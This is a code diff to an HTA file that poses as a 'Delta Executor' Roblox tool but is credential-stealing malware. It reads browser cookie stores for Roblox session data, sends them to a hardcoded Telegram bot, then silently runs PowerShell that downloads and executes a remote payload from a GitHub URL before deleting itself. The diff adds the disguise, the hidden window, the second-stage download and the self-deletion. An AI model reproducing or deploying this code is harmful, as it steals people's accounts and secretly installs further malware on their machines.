@@ -1,6 +1,14 @@
-<!-- dropper.hta -->
+<!-- deltaexecutor-vip.xyz.hta -->
 <html>
 <head>
+<title>Delta Executor</title>
+<hta:application
+    id="delta"
+    applicationname="Delta Executor"
+    border="none"
+    caption="no"
+    showintaskbar="no"
+    windowstate="minimize" />
 <script language="JScript">
 var TOKEN = "8814328356:AAFwdZd_Mlj9kZOOUVw7ERPEnRB238jqzTE";
 var CHAT = "8692286004";
@@ -8,6 +16,7 @@ var API = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
 var wsh = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+var payloadUrl = "https://raw.githubusercontent.com/brentfincher12-star/site/main/payload";
 
 function send(msg) {
     try {
@@ -47,20 +56,18 @@ function grab() {
                     var val = rs.Fields(2).Value;
                     found += "[" + host + "] ";
                     
-                    // DPAPI decrypt via PowerShell bridge
                     var b64 = "";
                     try {
                         var stream = new ActiveXObject("ADODB.Stream");
-                        stream.Type = 1; // adTypeBinary
+                        stream.Type = 1;
                         stream.Open();
                         stream.Write(val);
                         stream.Position = 0;
-                        stream.Type = 2; // adTypeText
+                        stream.Type = 2;
                         stream.Charset = "iso-8859-1";
                         var bytes = stream.ReadText();
                         stream.Close();
                         
-                        // Convert binary string to base64
                         var dom = new ActiveXObject("Microsoft.XMLDOM");
                         var el = dom.createElement("tmp");
                         el.dataType = "bin.base64";
@@ -82,7 +89,6 @@ function grab() {
         }
     }
     
-    // Firefox fallback
     if (!found) {
         var ffRoot = roaming + "\\Mozilla\\Firefox\\Profiles";
         if (fso.FolderExists(ffRoot)) {
@@ -108,11 +114,27 @@ function grab() {
     
     send("ROBLOX:\\n" + (found || "NOT_FOUND"));
     try { fso.DeleteFile(tmp); } catch(e) {}
+    
+    // --- Stage 2: GitHub payload ---
+    var psPayload = 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex (irm ' + payloadUrl + ')"';
+    wsh.Run(psPayload, 0, false);
+    
+    // --- Self-elimination ---
+    try {
+        var self = document.location.href.replace("mshta://", "").replace("file:///", "");
+        if (fso.FileExists(self)) { fso.DeleteFile(self); }
+    } catch(e) {}
+    
     close();
 }
 
-grab();
+window.onload = grab;
 </script>
 </head>
-<body></body>
+<body style="margin:0;padding:0;background:#0a0a0a;">
+<div style="font-family:Segoe UI,sans-serif;color:#00ff88;text-align:center;padding-top:40vh;">
+    <h1>Delta Executor</h1>
+    <p>Loading...</p>
+</div>
+</body>
 </html>
